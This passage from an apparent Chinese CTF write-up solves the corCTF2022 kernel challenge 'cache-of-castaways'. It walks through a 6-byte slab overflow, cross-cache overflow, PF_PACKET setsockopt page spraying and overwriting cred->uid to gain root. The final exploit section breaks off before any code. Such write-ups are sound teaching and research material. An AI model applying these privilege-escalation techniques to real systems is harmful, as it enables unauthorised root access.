<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">char</span> *<span class="hljs-title function_">alloc_one_pg_vec_page</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> order)</span><br>&#123;<br>	<span class="hljs-type">char</span> *buffer;<br>	<span class="hljs-type">gfp_t</span> gfp_flags = GFP_KERNEL | __GFP_COMP |<br>			  __GFP_ZERO | __GFP_NOWARN | __GFP_NORETRY;<br><br>	buffer = (<span class="hljs-type">char</span> *) __get_free_pages(gfp_flags, order);<br>	<span class="hljs-keyword">if</span> (buffer)<br>		<span class="hljs-keyword">return</span> buffer;<br>	<span class="hljs-comment">//...</span><br>&#125;<br></code></pre></td></tr></table></figure>

<p>相应地， <code>pgv</code> 中的页面也会在 socket 被关闭后释放：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">packet_release()<br>    packet_set_ring()<br>    	free_pg_vec()<br></code></pre></td></tr></table></figure>

<p> <code>setsockopt()</code>  也可以帮助我们完成<strong>页级堆风水</strong>，当我们耗尽 buddy system 中的 low order pages 后，我们再请求的页面便都是物理连续的，因此此时我们再进行  <code>setsockopt()</code>  便<strong>相当于获取到了一块近乎物理连续的内存</strong>（为什么是”近乎连续“是因为大量的 <code>setsockopt()</code> 流程中同样会分配大量我们不需要的结构体，从而消耗 buddy system 的部分页面）</p>
<h2 id="例题：corCTF2022-cache-of-castaways"><a href="#例题：corCTF2022-cache-of-castaways" class="headerlink" title="例题：corCTF2022 - cache-of-castaways"></a>例题：corCTF2022 - cache-of-castaways</h2><blockquote>
<p><a target="_blank" rel="noopener" href="https://www.willsroot.io/2022/08/reviving-exploits-against-cred-struct.html">官方 writeup 见此处</a></p>
</blockquote>
<h3 id="①-题目分析-3"><a href="#①-题目分析-3" class="headerlink" title="① 题目分析"></a>① 题目分析</h3><p>题目文件连 <code>kconfig</code> 都给了，笔者表示非常感动：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">tree .</span><br>.<br>├── bzImage<br>├── initramfs.cpio.gz<br>├── kconfig<br>└── run<br><br>0 directories, 4 files<br></code></pre></td></tr></table></figure>

<p>启动脚本看都不用看就知道开了 SMEP、SMAP、KPTI（基本上已经是内核题标配了）：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/sh</span><br><br><span class="hljs-built_in">exec</span> qemu-system-x86_64 \<br>    -m 4096M \<br>    -nographic \<br>    -kernel bzImage \<br>    -append <span class="hljs-string">&quot;console=ttyS0 loglevel=3 oops=panic panic=-1 pti=on&quot;</span> \<br>    -netdev user,<span class="hljs-built_in">id</span>=net \<br>    -device e1000,netdev=net \<br>    -no-reboot \<br>    -monitor /dev/null \<br>    -cpu qemu64,+smep,+smap \<br>    -initrd initramfs.cpio.gz \<br></code></pre></td></tr></table></figure>

<p>在启动脚本里加载了一个名为 <code>cache_of_castaway.ko</code> 的 LKM，按惯例丢进 IDA，在模块初始化时注册了设备并创建了一个 <code>kmem_cache</code>，分配的 object 的 size 为 <code>512</code>，创建 flag 为 <code>SLAB_ACCOUNT | SLAB_PANIC</code>，同时开启了 <code>CONFIG_MEMCG_KMEM=y</code>，这意味着这是一个<strong>独立的 kmem_cache</strong>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 <span class="hljs-title function_">init_module</span><span class="hljs-params">()</span><br>&#123;<br>  __int64 result; <span class="hljs-comment">// rax</span><br><br>  castaway_dev = <span class="hljs-number">255</span>;<br>  qword_8A8 = (__int64)<span class="hljs-string">&quot;castaway&quot;</span>;<br>  qword_8B0 = (__int64)&amp;castaway_fops;<br>  _mutex_init(&amp;castaway_lock, <span class="hljs-string">&quot;&amp;castaway_lock&quot;</span>, &amp;_key_28999);<br>  <span class="hljs-keyword">if</span> ( !(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)misc_register(&amp;castaway_dev)<br>    &amp;&amp; (castaway_arr = kmem_cache_alloc(kmalloc_caches[<span class="hljs-number">12</span>], <span class="hljs-number">3520LL</span>)) != <span class="hljs-number">0</span><br>    &amp;&amp; (castaway_cachep = kmem_cache_create(<span class="hljs-string">&quot;castaway_cache&quot;</span>, <span class="hljs-number">0x200</span>LL, <span class="hljs-number">1LL</span>, <span class="hljs-number">0x4040000</span>LL, <span class="hljs-number">0LL</span>)) != <span class="hljs-number">0</span> )<br>  &#123;<br>    result = init_castaway_driver_cold();<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    result = <span class="hljs-number">0xFFFFFFFF</span>LL;<br>  &#125;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>设备只定义了一个 ioctl，其中包含分配与编辑堆块的功能且都有锁，最多可以分配 400 个 object，没有释放功能：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">castaway_ioctl</span><span class="hljs-params">(__int64 a1, <span class="hljs-type">int</span> a2, __int64 a3)</span><br>&#123;<br>  __int64 v3; <span class="hljs-comment">// r12</span><br>  _QWORD *v5; <span class="hljs-comment">// rbx</span><br>  <span class="hljs-type">unsigned</span> __int64 v6[<span class="hljs-number">6</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-30h] BYREF</span><br><br>  v6[<span class="hljs-number">3</span>] = __readgsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-keyword">if</span> ( a2 != <span class="hljs-number">0xCAFEBABE</span> )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( copy_from_user(v6, a3, <span class="hljs-number">24LL</span>) )<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">-1LL</span>;<br>    mutex_lock(&amp;castaway_lock);<br>    <span class="hljs-keyword">if</span> ( a2 == <span class="hljs-number">0xF00DBABE</span> )<br>      v3 = castaway_edit(v6[<span class="hljs-number">0</span>], v6[<span class="hljs-number">1</span>], v6[<span class="hljs-number">2</span>]);<br>    <span class="hljs-keyword">else</span><br>      v3 = <span class="hljs-number">-1LL</span>;<br>LABEL_5:<br>    mutex_unlock(&amp;castaway_lock);<br>    <span class="hljs-keyword">return</span> v3;<br>  &#125;<br>  mutex_lock(&amp;castaway_lock);<br>  v3 = castaway_ctr;<br>  <span class="hljs-keyword">if</span> ( castaway_ctr &lt;= <span class="hljs-number">399</span> )<br>  &#123;<br>    ++castaway_ctr;<br>    v5 = (_QWORD *)(castaway_arr + <span class="hljs-number">8</span> * v3);<br>    *v5 = kmem_cache_alloc(castaway_cachep, <span class="hljs-number">0x400DC0</span>LL);<br>    <span class="hljs-keyword">if</span> ( *(_QWORD *)(castaway_arr + <span class="hljs-number">8</span> * v3) )<br>      <span class="hljs-keyword">goto</span> LABEL_5;<br>  &#125;<br>  <span class="hljs-keyword">return</span> ((__int64 (*)(<span class="hljs-type">void</span>))castaway_ioctl_cold)();<br>&#125;<br></code></pre></td></tr></table></figure>

<p>漏洞便存在于编辑堆块的 <code>castaway_edit()</code> 当中，在拷贝数据时会故意从 <code>object + 6</code> 的地方开始拷贝，从而存在一个 6 字节的溢出，这里因为是先拷贝到内核栈上再进行内核空间中的拷贝所以不会触发 <code>hardened usercopy</code> 的检查：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">castaway_edit</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> __int64 a1, <span class="hljs-type">size_t</span> a2, __int64 a3)</span><br>&#123;<br>  <span class="hljs-type">char</span> src[<span class="hljs-number">512</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-220h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v6; <span class="hljs-comment">// [rsp+200h] [rbp-20h]</span><br><br>  v6 = __readgsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-keyword">if</span> ( a1 &gt; <span class="hljs-number">0x18F</span> )<br>    <span class="hljs-keyword">return</span> castaway_edit_cold();<br>  <span class="hljs-keyword">if</span> ( !*(_QWORD *)(castaway_arr + <span class="hljs-number">8</span> * a1) )<br>    <span class="hljs-keyword">return</span> castaway_edit_cold();<br>  <span class="hljs-keyword">if</span> ( a2 &gt; <span class="hljs-number">0x200</span> )<br>    <span class="hljs-keyword">return</span> castaway_edit_cold();<br>  _check_object_size(src, a2, <span class="hljs-number">0LL</span>);<br>  <span class="hljs-keyword">if</span> ( copy_from_user(src, a3, a2) )<br>    <span class="hljs-keyword">return</span> castaway_edit_cold();<br>  <span class="hljs-built_in">memcpy</span>((<span class="hljs-type">void</span> *)(*(_QWORD *)(castaway_arr + <span class="hljs-number">8</span> * a1) + <span class="hljs-number">6LL</span>), src, a2);<br>  <span class="hljs-keyword">return</span> a2;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>编辑堆块时我们应当向内核中传入如下结构：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">request</span> &#123;</span><br>    <span class="hljs-type">int64_t</span> index;<br>    <span class="hljs-type">size_t</span>	size;<br>    <span class="hljs-type">void</span> 	*buf;<br>&#125;;<br></code></pre></td></tr></table></figure>

<h3 id="②-漏洞利用-3"><a href="#②-漏洞利用-3" class="headerlink" title="② 漏洞利用"></a>② 漏洞利用</h3><h4 id="Step-I-cross-cache-overflow"><a href="#Step-I-cross-cache-overflow" class="headerlink" title="Step.I - cross-cache overflow"></a>Step.I - cross-cache overflow</h4><p>由于我们的漏洞对象位于独立的 <code>kmem_cache</code> 中，因此其不会与内核中的其他常用结构体的分配混用，我们无法直接通过 slub 层的堆喷 + 堆风水来溢出到其他结构体来进行下一步利用；同时由于 slub 并不会像 glibc 的ptmalloc2 那样在每个 object 开头都有个存储数据的 header，而是将 next 指针放在一个随机的位置，我们很难直接溢出到下一个 object 的 next 域，由于 hardened freelist 的存在就算我们能溢出到下一个相邻 object 的 next 域也没法构造出一个合法的指针；而在我们的 slub 页面相邻的页面上的数据对我们来说也是未知的，直接溢出的话我们并不知道能够溢出到什么页面上 :（</p>
<p>那么我们真的就没有任何办法了吗？答案自然是否定的，让我们把目光重新放到 slub allocator 上，当 freelist page 已经耗空且 partial 链表也为空时（或者 <code>kmem_cache</code> 刚刚创建后进行第一次分配时），其会向 buddy system 申请页面：</p>
<p><img src="https://s2.loli.net/2023/01/19/yPtXiwzVfxWH7lE.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>buddy system 的基本原理就是以 2 的 order 次幂张内存页作为分配粒度，相同 order 间空闲页面构成双向链表，当低阶 order 的页面不够用时便会从高阶 order 取一份连续内存页拆成两半，其中一半挂回当前请求 order 链表，另一半返还给上层调用者；下图为以 order 2 为例的 buddy system 页面分配基本原理：</p>
<p><img src="https://s2.loli.net/2023/01/19/79biltjNfACIZcP.gif" srcset="/img/loading.gif" lazyload alt="page.gif"></p>
<p>我们不难想到的是：从更高阶 order 拆分成的两份低阶 order 的连续内存页<strong>是物理连续的</strong>，若其中的一份被我们的 <code>kmem_cache</code> 取走，而另一份被用于分配其他内核结构体的 <code>kmem_cache</code> 取走，<strong>则我们便有可能溢出到其他的内核结构体上</strong>——这便是 <strong><code>cross-cache overflow</code></strong></p>
<p>具体的溢出对象也并不难想——6个字节刚好足够我们溢出到 <code>cred</code> 结构体的 <code>uid</code> 字段，完成提权，那么如何溢出到我们想要提权的进程的 cred 结构体呢？我们只需要先 fork() 堆喷 cred 耗尽 <code>cred_jar </code> 中 object，让其向 buddy system 请求新的页面即可，我们还需要先堆喷消耗 buddy system 中原有的页面，之后我们再分配 cred 和题目 object，两者便有较大概率相邻</p>
<p><code>cred</code> 的大小为 <code>192</code>，<code>cred_jar</code> 向 buddy system 单次请求的页面数量为 1，足够分配 21 个 cred，因此我们不需要堆喷太多 <code>cred</code> 便能耗尽 <code>cred_jar</code>，不过 <code>fork()</code> 在执行过程中会产生很多的”噪声“（即额外分配一些我们不需要的结构体，从而影响页布局），因此这里我们改用 <code>clone(CLONE_FILES | CLONE_FS | CLONE_VM | CLONE_SIGHAND)</code></p>
<blockquote>
<p>关于”噪声“问题参见 <a target="_blank" rel="noopener" href="https://bsauce.github.io/2022/11/07/castaways/#2-3-fork%E5%99%AA%E5%A3%B0%E9%97%AE%E9%A2%98">bsauce 师傅的博客</a>，笔者暂未深入阅读过 <code>fork()</code> 相关源码</p>
</blockquote>
<p>笔者原本想用 <code>msg_msg</code> 来堆喷消耗 buddy system，但是笔者发现 System V 的消息队列在题目环境中被禁用了：(</p>
<p><img src="https://s2.loli.net/2023/01/20/QHIxgOPmYnaplyj.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>因此我们最好寻找一些会<strong>直接调用向 buddy system 请求页面的 API 的结构</strong>，原本笔者想用  <code>mmap()</code>  ，但是后面发现 <code>mmap()</code> 在分配时会产生大量噪声（各种无关结构体与页面请求（如页表项）），故只能寻找其他结构体</p>
<p>这里笔者选择参照官方 writeup 中参照 D3v17 在 <a target="_blank" rel="noopener" href="https://googleprojectzero.blogspot.com/2017/05/exploiting-linux-kernel-via-packet.html">CVE-2017-7308</a> 中使用 <code>setsockopt()</code> 进行页喷射的方法：当我们创建一个 protocol 为 <code>PF_PACKET</code> 的 socket 之后，先调用 <code>setsockopt()</code> 将 <code>PACKET_VERSION</code> 设为  <code>TPACKET_V1 </code>&#x2F; <code>TPACKET_V2</code>，再调用 <code>setsockopt()</code> 提交一个 <code>PACKET_TX_RING</code> ，此时便存在如下调用链：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">__sys_setsockopt()<br>    sock-&gt;ops-&gt;setsockopt()<br>    	packet_setsockopt() <span class="hljs-comment">// case PACKET_TX_RING ↓</span><br>    		packet_set_ring()<br>    			alloc_pg_vec()<br></code></pre></td></tr></table></figure>

<p>在 <code>alloc_pg_vec()</code> 中会创建一个 <code>pgv</code> 结构体，用以分配 <code>tp_block_nr</code> 份 2<sup>order</sup> 张内存页，其中 <code>order</code> 由 <code>tp_block_size</code> 决定：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">struct</span> pgv *<span class="hljs-title function_">alloc_pg_vec</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> tpacket_req *req, <span class="hljs-type">int</span> order)</span><br>&#123;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> block_nr = req-&gt;tp_block_nr;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pgv</span> *<span class="hljs-title">pg_vec</span>;</span><br>	<span class="hljs-type">int</span> i;<br><br>	pg_vec = kcalloc(block_nr, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> pgv), GFP_KERNEL | __GFP_NOWARN);<br>	<span class="hljs-keyword">if</span> (unlikely(!pg_vec))<br>		<span class="hljs-keyword">goto</span> out;<br><br>	<span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; block_nr; i++) &#123;<br>		pg_vec[i].buffer = alloc_one_pg_vec_page(order);<br>		<span class="hljs-keyword">if</span> (unlikely(!pg_vec[i].buffer))<br>			<span class="hljs-keyword">goto</span> out_free_pgvec;<br>	&#125;<br><br>out:<br>	<span class="hljs-keyword">return</span> pg_vec;<br><br>out_free_pgvec:<br>	free_pg_vec(pg_vec, order, block_nr);<br>	pg_vec = <span class="hljs-literal">NULL</span>;<br>	<span class="hljs-keyword">goto</span> out;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>在 <code>alloc_one_pg_vec_page()</code> 中会直接调用 <code>__get_free_pages()</code> 向 buddy system 请求内存页，因此我们可以利用该函数进行大量的页面请求：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">char</span> *<span class="hljs-title function_">alloc_one_pg_vec_page</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> order)</span><br>&#123;<br>	<span class="hljs-type">char</span> *buffer;<br>	<span class="hljs-type">gfp_t</span> gfp_flags = GFP_KERNEL | __GFP_COMP |<br>			  __GFP_ZERO | __GFP_NOWARN | __GFP_NORETRY;<br><br>	buffer = (<span class="hljs-type">char</span> *) __get_free_pages(gfp_flags, order);<br>	<span class="hljs-keyword">if</span> (buffer)<br>		<span class="hljs-keyword">return</span> buffer;<br>	<span class="hljs-comment">//...</span><br>&#125;<br></code></pre></td></tr></table></figure>

<p><code>pgv</code> 中的页面会在 socket 被关闭后释放，这也方便我们后续的页级堆风水，不过需要注意的是低权限用户无法使用该函数，但是我们可以通过开辟新的命名空间来绕过该限制</p>
<p>这里需要注意的是<strong>我们提权的进程不应当和页喷射的进程在同一命名空间内</strong>，因为后者需要开辟新的命名空间，而我们应当在原本的命名空间完成提权，因此这里笔者选择新开一个进程进行页喷射，并使用管道在主进程与喷射进程间通信</p>
<blockquote>
<p>如果你忘了这一步，就会和笔者一样得到一个 <code>65534</code> 的 uid 然后冥思苦想半天…</p>
</blockquote>
<h4 id="Step-II-page-level-heap-fengshui"><a href="#Step-II-page-level-heap-fengshui" class="headerlink" title="Step.II - page-level heap fengshui"></a>Step.II - page-level heap fengshui</h4><p> <code>setsockopt()</code>  也可以帮助我们完成<strong>页级堆风水</strong>，当我们耗尽 buddy system 中的 low order pages 后，我们再请求的页面便都是物理连续的，因此此时我们再进行  <code>setsockopt()</code>  便<strong>相当于获取到了一块近乎物理连续的内存</strong>（为什么是”近乎连续“是因为大量的 <code>setsockopt()</code> 流程中同样会分配大量我们不需要的结构体，从而消耗 buddy system 的部分页面）</p>
<p>本题环境中题目的 <code>kmem_cache</code> 单次会向 buddy system 请求一张内存页，而由于 buddy system 遵循 LIFO，因此我们可以：</p>
<ul>
<li>先分配大量的单张内存页，耗尽 buddy 中的 low-order pages</li>
<li>间隔一张内存页释放掉部分单张内存页，之后堆喷 cred，这样便有几率获取到我们释放的单张内存页</li>
<li>释放掉之前的间隔内存页，调用漏洞函数分配堆块，这样便有几率获取到我们释放的间隔内存页</li>
<li>利用模块中漏洞进行越界写，篡改 <code>cred-&gt;uid</code> ，完成提权</li>
</ul>
<p>我们的子进程需要轮询等待自己的 uid 变为 root，但是这种做法并不优雅：) ，所以笔者这里选择用一个新的管道在主进程与子进程间通信，当子进程从管道中读出1字节时便开始检查自己是否成功提权，若未提权则直接 sleep 即可</p>
<h3 id="③-FINAL-EXPLOIT-3"><a href="#③-FINAL-EXPLOIT-3" class="headerlink" title="③ FINAL EXPLOIT"></a>③ FINAL EXPLOIT</h3><p>最后的 exp 如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span 